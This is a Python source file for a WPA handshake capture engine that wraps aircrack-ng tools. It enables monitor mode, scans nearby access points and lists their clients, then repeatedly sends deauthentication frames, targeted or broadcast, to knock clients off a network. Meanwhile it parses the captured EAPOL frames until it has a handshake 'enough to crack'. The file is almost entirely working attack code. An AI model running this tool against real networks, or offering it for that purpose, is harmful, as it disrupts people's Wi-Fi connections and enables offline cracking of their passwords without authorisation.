"""
Handshake capture engine (airmon/airodump/aireplay wrappers).
Emits events for the UI: step, log, aps, clients, handshake, done.
"""
from __future__ import annotations

import csv
import os
import re
import shutil
import signal
import subprocess
import tempfile
import threading
import time
from pathlib import Path
from typing import Callable, Optional


EventCB = Callable[[str, dict], None]


class CaptureEngine:
    def __init__(
        self,
        phy_iface: str = "wlan1",
        out_dir: str = "/home/kali/transform_engine/handshake",
        deauth_count: int = 1,
        retry_sleep: float = 5.0,
        scan_time: int = 20,
        deauth_delay: float = 8.0,
        deauth_interval: float = 60.0,
        target_client: Optional[str] = None,
        on_event: Optional[EventCB] = None,
    ):
        self.phy_iface = phy_iface
        self.out_dir = Path(out_dir)
        self.deauth_count = str(max(1, int(deauth_count)))
        self.retry_sleep = retry_sleep
        self.scan_time = scan_time
        self.deauth_delay = float(deauth_delay)
        self.deauth_interval = float(deauth_interval)  # seconds between deauths
        self.target_client = (target_client or "").strip() or None
        self.on_event = on_event or (lambda *_: None)
        self._stop = threading.Event()
        self.mon_iface: Optional[str] = None
        self.out_dir.mkdir(parents=True, exist_ok=True)

    def stop(self):
        self._stop.set()

    def _emit(self, kind: str, **data):
        try:
            self.on_event(kind, data)
        except Exception:
            pass

    def _log(self, msg: str, level: str = "info"):
        self._emit("log", msg=msg, level=level)

    def _needs_sudo(self) -> bool:
        """True when the process is not root and must elevate."""
        return os.geteuid() != 0

    def _elevate(self, cmd):
        """Prefix command with sudo -n when we are not root."""
        if not self._needs_sudo():
            return cmd
        if isinstance(cmd, str):
            return "sudo -n " + cmd
        return ["sudo", "-n"] + list(cmd)

    def _run(self, cmd, capture=True):
        cmd = self._elevate(cmd)
        try:
            r = subprocess.run(
                cmd,
                shell=isinstance(cmd, str),
                capture_output=capture,
                text=True,
            )
            return r.returncode, r.stdout or "", r.stderr or ""
        except Exception as e:
            return 1, "", str(e)

    def _popen(self, cmd, **kwargs):
        """Popen with automatic elevation when not root."""
        cmd = self._elevate(cmd)
        return subprocess.Popen(cmd, **kwargs)

    def check_tools(self) -> list:
        missing = [b for b in ("airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng", "iw")
                   if shutil.which(b) is None]
        return missing

    def can_elevate(self) -> bool:
        """True if already root, or passwordless sudo works for the needed tools."""
        if os.geteuid() == 0:
            return True
        # Test with a command that is actually in the sudoers rule (not "true")
        for probe in (["sudo", "-n", "iw", "dev"], ["sudo", "-n", "airmon-ng"]):
            try:
                r = subprocess.run(probe, capture_output=True, text=True, timeout=5)
                # iw/airmon return 0 or print usage; password-required is a clear failure
                err = (r.stderr or "") + (r.stdout or "")
                if "password is required" in err.lower() or "a password is required" in err.lower():
                    continue
                if r.returncode in (0, 1, 255):  # 255 sometimes from airmon with no args
                    return True
            except Exception:
                continue
        return False

    def require_root(self) -> bool:
        # kept for compatibility — now means "can we run privileged ops"
        return self.can_elevate()

    # ---- steps ----
    def kill_interfering(self):
        self._emit("step", name="Kill interfering processes", index=1, total=4)
        t0 = time.time()
        rc, out, err = self._run("airmon-ng check kill")
        self._log((out + err).strip() or "done")
        self._emit("step_done", name="Kill interfering", seconds=time.time() - t0)

    def start_monitor(self) -> str:
        self._emit("step", name=f"Enable monitor mode on {self.phy_iface}", index=2, total=4)
        t0 = time.time()
        rc, out, _ = self._run("iw dev")
        if re.search(rf"Interface {self.phy_iface}\b[\s\S]*?type monitor", out):
            self._log(f"{self.phy_iface} already in monitor mode", "ok")
            self.mon_iface = self.phy_iface
            self._emit("step_done", name="Monitor mode", seconds=time.time() - t0)
            return self.mon_iface

        rc, out, err = self._run(f"airmon-ng start {self.phy_iface}")
        self._log((out + err).strip())
        rc, out, _ = self._run("iw dev")
        mon_ifaces = re.findall(r"Interface (\S+)\s+[\s\S]*?type monitor", out)
        if not mon_ifaces:
            self._log("No monitor interface found", "error")
            raise RuntimeError("No monitor-mode interface found")
        self.mon_iface = mon_ifaces[0]
        self._log(f"Monitor interface: {self.mon_iface}", "ok")
        self._emit("step_done", name="Monitor mode", seconds=time.time() - t0)
        self._emit("monitor", iface=self.mon_iface)
        return self.mon_iface

    def scan_networks(self) -> list:
        mon = self.mon_iface or self.phy_iface
        self._emit("step", name=f"Scan networks ({self.scan_time}s)", index=3, total=4)
        t0 = time.time()
        tmp = Path(tempfile.mkdtemp(prefix="hs_scan_"))
        prefix = tmp / "scan"
        cmd = ["airodump-ng", "--write", str(prefix), "--output-format", "csv", mon]
        proc = self._popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        csv_path = tmp / "scan-01.csv"
        aps = {}
        try:
            for remaining in range(self.scan_time, 0, -1):
                if self._stop.is_set():
                    break
                if csv_path.exists():
                    aps = self._parse_ap_csv(csv_path)
                    self._emit("aps", aps=list(aps.values()), remaining=remaining)
                self._emit("scan_tick", remaining=remaining, count=len(aps))
                time.sleep(1)
        finally:
            proc.send_signal(signal.SIGINT)
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
        if csv_path.exists():
            aps = self._parse_ap_csv(csv_path)
        shutil.rmtree(tmp, ignore_errors=True)
        self._emit("aps", aps=list(aps.values()), remaining=0)
        self._emit("step_done", name="Scan", seconds=time.time() - t0)
        return list(aps.values())

    def capture_handshake(self, ap: dict) -> tuple:
        mon = self.mon_iface or self.phy_iface
        bssid = ap["bssid"]
        channel = ap["channel"]
        essid_safe = re.sub(r"[^A-Za-z0-9_.-]", "_", ap["essid"])[:24] or "ap"
        out_prefix = self.out_dir / f"hs_{essid_safe}_{bssid.replace(':', '')}"
        cap_path = Path(str(out_prefix) + "-01.cap")

        self._emit("step", name=f"Capture {ap['essid']}", index=4, total=4)
        self._run(f"iw dev {mon} set channel {channel}")
        self._log(f"Channel set to {channel}, writing {cap_path}")

        # ---- 1) START CAPTURE FIRST (no deauth yet) ----
        cap_cmd = [
            "airodump-ng", "--bssid", bssid, "-c", channel,
            "--write", str(out_prefix), "--output-format", "csv,pcap", mon,
        ]
        cap_proc = self._popen(cap_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        csv_path = Path(f"{out_prefix}-01.csv")
        handshake_seen = False
        attempt = 0
        t0 = time.time()
        msgs = {"M1": False, "M2": False, "M3": False, "M4": False}
        deauth_started = False

        try:
            # wait for airodump to create files
            for _ in range(50):
                if csv_path.exists() or self._stop.is_set():
                    break
                time.sleep(0.1)

            self._log(
                f"Capture running — waiting {self.deauth_delay:.0f}s before deauth "
                f"(listening for EAPOL M1–M4)",
                "ok",
            )

            # ---- 2) DELAY WINDOW: listen only, stream M1–M4 ----
            delay_end = time.time() + self.deauth_delay
            prev_msgs = {"M1": False, "M2": False, "M3": False, "M4": False}
            while not self._stop.is_set() and time.time() < delay_end:
                clients = self._parse_client_csv(csv_path, bssid) if csv_path.exists() else []
                msgs, eapol_n = self._parse_eapol_messages(cap_path, bssid, return_count=True)
                for m in ("M1", "M2", "M3", "M4"):
                    if msgs.get(m) and not prev_msgs.get(m):
                        self._log(f"EAPOL {m} received ✓", "ok")
                prev_msgs = dict(msgs)
                crackable = msgs["M1"] and msgs["M2"]
                handshake_seen = crackable or self._detect_handshake(out_prefix)
                remaining = max(0, delay_end - time.time())
                self._emit(
                    "capture_status",
                    attempt=0,
                    clients=clients,
                    handshake=handshake_seen,
                    messages=dict(msgs),
                    eapol_count=eapol_n,
                    deauth_active=False,
                    deauth_countdown=remaining,
                    elapsed=time.time() - t0,
                    ap=ap,
                    path=str(cap_path),
                )
                if handshake_seen:
                    self._log("SUCCESS — got handshake during pre-deauth listen!", "ok")
                    time.sleep(1.5)
                    break
                time.sleep(0.4)

            if handshake_seen:
                # already done
                pass
            else:
                self._log("Delay finished — starting deauth rounds", "warn")
                deauth_started = True

            # ---- 3) DEAUTH LOOP while streaming M1–M4 ----
            while not self._stop.is_set() and not handshake_seen:
                attempt += 1
                clients = self._parse_client_csv(csv_path, bssid) if csv_path.exists() else []
                msgs = self._parse_eapol_messages(cap_path, bssid)
                crackable = msgs["M1"] and msgs["M2"]
                full4 = all(msgs.values())
                handshake_seen = crackable or self._detect_handshake(out_prefix)

                self._emit(
                    "capture_status",
                    attempt=attempt,
                    clients=clients,
                    handshake=handshake_seen,
                    messages=dict(msgs),
                    deauth_active=True,
                    deauth_countdown=0,
                    elapsed=time.time() - t0,
                    ap=ap,
                    path=str(cap_path),
                )

                # log newly seen messages
                for m, got in msgs.items():
                    if got:
                        pass  # UI shows them; avoid spam

                if handshake_seen:
                    if full4:
                        self._log("SUCCESS — full 4-way handshake (M1 M2 M3 M4)!", "ok")
                    else:
                        self._log("SUCCESS — got M1+M2 (enough to crack)!", "ok")
                    time.sleep(2)
                    break

                # One targeted deauth (or broadcast if no client), then wait full interval.
                n_deauth = max(1, int(self.deauth_count))
                target = self.target_client
                if not target and clients:
                    target = clients[0]["station"]

                if target:
                    self._log(
                        f"Deauth #{attempt}: {n_deauth} frame(s) → client {target} "
                        f"(next in {self.deauth_interval:.0f}s)"
                    )
                    self._run([
                        "aireplay-ng", "--deauth", str(n_deauth),
                        "-a", bssid, "-c", target, mon,
                    ])
                else:
                    self._log(
                        f"Deauth #{attempt}: {n_deauth} broadcast frame(s) "
                        f"(no client yet; next in {self.deauth_interval:.0f}s)"
                    )
                    self._run([
                        "aireplay-ng", "--deauth", str(n_deauth),
                        "-a", bssid, mon,
                    ])

                # Listen for the rest of the interval (minus a little for the deauth itself)
                listen_s = max(self.deauth_interval, 15.0)
                self._log(f"Listening {listen_s:.0f}s for full 4-way (M1–M4)…")
                listen_end = time.time() + listen_s
                prev_msgs = dict(msgs)
                while not self._stop.is_set() and time.time() < listen_end:
                    msgs, eapol_n = self._parse_eapol_messages(cap_path, bssid, return_count=True)
                    for m in ("M1", "M2", "M3", "M4"):
                        if msgs.get(m) and not prev_msgs.get(m):
                            self._log(f"EAPOL {m} received ✓", "ok")
                    prev_msgs = dict(msgs)

                    crackable = msgs["M1"] and msgs["M2"]
                    aircrack_ok = self._detect_handshake(out_prefix)
                    handshake_seen = crackable or aircrack_ok

                    self._emit(
                        "capture_status",
                        attempt=attempt,
                        clients=clients,
                        handshake=handshake_seen,
                        messages=dict(msgs),
                        eapol_count=eapol_n,
                        deauth_active=True,
                        elapsed=time.time() - t0,
                        ap=ap,
                        path=str(cap_path),
                    )
                    if handshake_seen:
                        if all(msgs.values()):
                            self._log("SUCCESS — full 4-way (M1 M2 M3 M4)!", "ok")
                        elif crackable:
                            self._log("SUCCESS — M1+M2 (enough to crack)!", "ok")
                        else:
                            self._log("SUCCESS — aircrack-ng reports handshake!", "ok")
                        break
                    time.sleep(0.35)
        finally:
            cap_proc.send_signal(signal.SIGINT)
            try:
                cap_proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                cap_proc.kill()

        if not handshake_seen:
            msgs = self._parse_eapol_messages(cap_path, bssid)
            handshake_seen = (msgs["M1"] and msgs["M2"]) or self._detect_handshake(out_prefix)

        self._emit(
            "step_done",
            name="Capture",
            seconds=time.time() - t0,
            handshake=handshake_seen,
            messages=msgs,
            path=str(cap_path),
        )
        self._emit(
            "done",
            handshake=handshake_seen,
            messages=msgs,
            path=str(cap_path),
            prefix=str(out_prefix),
        )
        return handshake_seen, out_prefix

    def _fix_ownership(self):
        """airodump run via sudo creates root-owned files — give them back to the user."""
        if not self._needs_sudo():
            return
        try:
            import pwd
            user = pwd.getpwuid(os.getuid()).pw_name
            # chown the whole out dir contents back to the invoking user
            self._run(["chown", "-R", f"{user}:{user}", str(self.out_dir)])
        except Exception as e:
            self._log(f"chown warning: {e}", "warn")

    def cleanup(self):
        self._log("Cleaning up monitor mode…")
        self._run(f"airmon-ng stop {self.phy_iface}mon")
        self._run(f"airmon-ng stop {self.phy_iface}")
        self._run("systemctl restart NetworkManager")
        self._fix_ownership()
        self._log("NetworkManager restarted", "ok")

    # ---- parsers ----
    @staticmethod
    def _parse_ap_csv(path) -> dict:
        aps = {}
        try:
            with open(path, "r", errors="ignore") as f:
                for row in csv.reader(f):
                    if not row or len(row) < 14:
                        if row and "BSSID" not in row[0]:
                            break
                        continue
                    if row[0].strip() == "BSSID":
                        continue
                    bssid = row[0].strip()
                    if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid):
                        continue
                    aps[bssid] = {
                        "bssid": bssid,
                        "channel": row[3].strip(),
                        "privacy": row[5].strip(),
                        "power": row[8].strip(),
                        "essid": row[13].strip() or "<hidden>",
                    }
        except Exception:
            pass
        return aps

    @staticmethod
    def _parse_client_csv(path, bssid) -> list:
        clients = []
        try:
            with open(path, "r", errors="ignore") as f:
                in_stations = False
                for row in csv.reader(f):
                    if not row:
                        continue
                    if row[0].strip().startswith("Station MAC"):
                        in_stations = True
                        continue
                    if not in_stations or len(row) < 6:
                        continue
                    sta = row[0].strip()
                    if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", sta):
                        continue
                    if bssid.lower() not in row[5].strip().lower():
                        continue
                    clients.append({
                        "station": sta,
                        "power": row[3].strip(),
                        "probed": row[6].strip() if len(row) > 6 else "",
                    })
        except Exception:
            pass
        return clients

    def _parse_eapol_messages(self, cap_path: Path, bssid: str, return_count: bool = False):
        """
        Parse .cap for EAPOL 4-way messages.
        Returns dict M1–M4, or (dict, eapol_count) if return_count.
        Copies file first so we don't read while airodump is writing.
        """
        result = {"M1": False, "M2": False, "M3": False, "M4": False}
        eapol_n = 0
        if not cap_path.exists() or cap_path.stat().st_size < 24:
            return (result, 0) if return_count else result

        import struct
        import tempfile
        import shutil as _shutil

        tmp = None
        try:
            fd, tmp = tempfile.mkstemp(suffix=".cap")
            os.close(fd)
            _shutil.copyfile(str(cap_path), tmp)
        except Exception:
            if return_count:
                return result, 0
            return result

        bssid_l = bssid.lower().replace("-", ":")
        frames = []  # list of (from_ap, has_mic, has_ack, has_install, key_info)

        # --- try scapy ---
        try:
            from scapy.all import rdpcap, EAPOL, Dot11  # type: ignore
            pkts = rdpcap(tmp)
            for pkt in pkts:
                try:
                    if not pkt.haslayer(EAPOL):
                        continue
                    raw = bytes(pkt[EAPOL])
                    if len(raw) < 95:
                        continue
                    key_info = struct.unpack(">H", raw[5:7])[0]
                    if not (key_info & 0x0008):
                        continue
                    eapol_n += 1
                    has_mic = bool(key_info & 0x0100)
                    has_ack = bool(key_info & 0x0080)
                    has_install = bool(key_info & 0x0040)

                    # BSSID can be in addr1/2/3 depending on ToDS/FromDS
                    addrs = []
                    for a in (getattr(pkt, "addr1", None),
                              getattr(pkt, "addr2", None),
                              getattr(pkt, "addr3", None)):
                        if a:
                            addrs.append(a.lower())
                    if bssid_l and addrs and bssid_l not in addrs:
                        # still accept — filter may drop valid frames on some captures
                        pass

                    src = (getattr(pkt, "addr2", None) or "").lower()
                    from_ap = (src == bssid_l) if src and bssid_l else has_ack
                    frames.append((from_ap, has_mic, has_ack, has_install, key_info))
                except Exception:
                    continue
        except Exception:
            frames = []

        # --- raw fallback: scan for EAPOL ethertype 0x888e ---
        if not frames:
            try:
                data = Path(tmp).read_bytes()
                # look for 88 8e followed by typical EAPOL-Key
                i = 0
                while True:
                    j = data.find(b"\x88\x8e", i)
                    if j < 0 or j + 10 >= len(data):
                        break
                    # EAPOL starts after ethertype
                    eapol = data[j + 2:]
                    if len(eapol) < 99:
                        i = j + 2
                        continue
                    # version, type=3 (key)
                    if eapol[1] != 3:
                        i = j + 2
                        continue
                    key_info = struct.unpack(">H", eapol[5:7])[0]
                    if not (key_info & 0x0008):
                        i = j + 2
                        continue
                    eapol_n += 1
                    has_mic = bool(key_info & 0x0100)
                    has_ack = bool(key_info & 0x0080)
                    has_install = bool(key_info & 0x0040)
                    from_ap = has_ack  # heuristic without 802.11 hdr
                    frames.append((from_ap, has_mic, has_ack, has_install, key_info))
                    i = j + 2
            except Exception:
                pass

        try:
            os.unlink(tmp)
        except Exception:
            pass

        # Classify in time order
        saw_m3 = False
        for from_ap, has_mic, has_ack, has_install, key_info in frames:
            if not has_mic and has_ack:
                result["M1"] = True
            elif has_mic and has_install and has_ack:
                result["M3"] = True
                saw_m3 = True
            elif has_mic and not has_ack:
                if saw_m3:
                    result["M4"] = True
                else:
                    result["M2"] = True
            elif has_mic and has_ack and not has_install:
                # some routers: M3 without install bit
                if from_ap:
                    result["M3"] = True
                    saw_m3 = True
                else:
                    result["M2"] = True

        if return_count:
            return result, eapol_n
        return result

    def _detect_handshake(self, out_prefix: Path) -> bool:
        caps = sorted(Path(out_prefix.parent).glob(f"{out_prefix.name}-*.cap"))
        if not caps:
            return False
        rc, out, _ = self._run(["aircrack-ng", str(caps[-1])])
        return "1 handshake" in out or "(1 handshake" in out
